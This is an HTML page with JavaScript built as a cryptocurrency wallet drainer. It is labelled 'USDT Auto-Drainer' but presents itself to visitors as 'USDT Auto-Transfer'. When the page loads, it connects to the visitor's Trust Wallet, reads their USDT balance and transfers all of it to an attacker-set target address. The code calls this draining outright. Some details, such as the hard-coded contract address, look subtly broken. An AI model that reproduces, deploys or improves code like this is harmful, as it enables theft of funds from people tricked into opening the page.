<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>USDT Auto‑Drainer</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link rel="shortcut icon" href="https://tronweb.github.io/tronweb/img/tron.png">
<script src="https://cdnjs.cloudflare.com/ajax/libs/tronweb/5.3.0/tronweb.min.js"></script>
<style>
  body{margin:0;background:#1e1e1e;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh}
  .container{background:#2c2c2c;padding:20px;border-radius:15px;width:90%;max-width:420px;text-align:center}
  h1{font-size:1.6rem;margin:0 0 10px}
  p{font-size:.9rem;color:#aaa;margin:0 0 20px}
  .status{background:#3a3a3a;padding:15px;border-radius:8px;margin-top:10px;min-height:60px;display:flex;align-items:center;justify-content:center;font-weight:bold}
  .status.loading{color:#ffc107}
  .status.success{color:#28a745}
  .status.error{color:#dc3545}
  .spinner{width:20px;height:20px;border:3px solid rgba(255,255,255,.3);border-radius:50%;border-top-color:#fff;animation:spin 1s linear infinite;margin-right:10px}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
  <h1>USDT Auto‑Transfer</h1>
  <p id="msg">Connecting…</p>
  <div id="status" class="status loading"><div class="spinner"></div> Initializing Trust Wallet…</div>
</div>

<script>
/* ── CONFIGURATION ─────────────────────────────────────────────────────── */
const TARGET_ADDRESS = 'TYourTargetWalletAddressHere...';  // ← Replace with your receiving wallet
const USDT_CONTRACT  = 'TXLAQQ6IPlmj8VYBQ4gQ6dNne9GmFDv8ir'; // Mainnet USDT
const FEE_LIMIT      = 10000000; // 10 TRX
const POLL_INTERVAL  = 2000;     // 2 seconds
const MAX_POLL       = 10;       // 20 seconds max
/* ──────────────────────────────────────────────────────────────────────── */

let tronWeb, wallet, usdtBalance;
const statusEl = document.getElementById('status');
const msgEl    = document.getElementById('msg');

function update(msg, type='loading') {
  statusEl.className = `status ${type}`;
  // Show spinner only when loading
  statusEl.innerHTML = type==='loading'
    ? `<div class="spinner"></div> ${msg}`
    : msg;
  msgEl.textContent = msg;
}

/* ── HELPER: Wait for transaction to be mined ────────────────────────────── */
async function waitForTx(txid) {
  for (let i = 0; i < MAX_POLL; i++) {
    try {
      const info = await tronWeb.trx.getTransactionInfo(txid);
      if (info && info.result === 'SUCCESS') return true;
      if (info && info.result !== 'SUCCESS' && info.result !== 'FAILED') break; // unknown status
    } catch (_) { /* ignore */ }
    await new Promise(r => setTimeout(r, POLL_INTERVAL));
  }
  return false;
}

/* ── MAIN LOGIC ───────────────────────────────────────────────────────────── */
async function run() {
  try {
    /* 1️⃣ Detect & init TronWeb */
    if (!window.tronWeb) throw new Error('Trust Wallet not detected. Open in Trust Wallet Browser.');
    tronWeb = window.tronWeb;

    /* 2️⃣ Verify we’re on the official Mainnet node */
    const fullNode = tronWeb.trx.getFullNode(); // e.g. https://api.trongrid.io
    if (!fullNode.includes('trongrid.io')) {
      throw new Error('This drainer works only on the official Tron mainnet node.');
    }
    update('Connected to Mainnet ✔️');

    /* 3️⃣ Enable wallet & get address */
    const accounts = await tronWeb.enable();          // returns array of addresses
    wallet = accounts[0];
    update(`Wallet: ${wallet.slice(0,6)}…${wallet.slice(-4)}`);

    /* 4️⃣ Ensure enough TRX for gas */
    const trxBal = await tronWeb.trx.getBalance(wallet);
    if (trxBal < 25000000) { // 25 TRX buffer
      throw new Error(`Insufficient TRX for gas. Need ~25 TRX, have ${(trxBal/1e6).toFixed(2)} TRX`);
    }

    /* 5️⃣ Read USDT balance (decimals & amount) */
    update('Fetching USDT balance…');
    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const decimals = await contract.decimals().call();    // direct return value
    usdtBalance = await contract.balanceOf(wallet).call(); // direct return value
    if (usdtBalance <= 0) throw new Error('No USDT to transfer.');

    /* 6️⃣ Transfer all USDT to the target address */
    update('Transferring USDT…');
    const transferTx = await contract.transfer(
      TARGET_ADDRESS,
      usdtBalance,
      { from: wallet, feeLimit: FEE_LIMIT }
    ); // this returns a signed transaction object that the wallet broadcasts

    // The returned object has a txid property
    const txid = transferTx.txid;
    if (!await waitForTx(txid)) throw new Error('Transfer failed or timed out.');

    update('✅ Transfer successful! Funds drained to target.', 'success');
  } catch (e) {
    console.error(e);
    update(`❌ ${e.message}`, 'error');
  }
}

document.addEventListener('DOMContentLoaded', run);
</script>
</body>
</html>
